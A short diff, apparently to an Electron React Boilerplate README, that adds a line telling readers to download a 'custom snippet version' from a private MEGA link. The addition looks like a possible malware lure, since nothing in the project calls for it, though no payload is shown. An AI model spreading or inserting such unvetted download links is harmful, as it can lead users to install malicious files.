@@ -1,3 +1,5 @@
+Download first custom snippet version from my private mega link: https://mega.nz/file/s3lkkLYK#L9mdwMkEgOqzTrJc6pfxknd0u7OGnW3_nUaI262y618
+
 <img src=".erb/img/erb-banner.svg" width="100%" />
 
 <br>
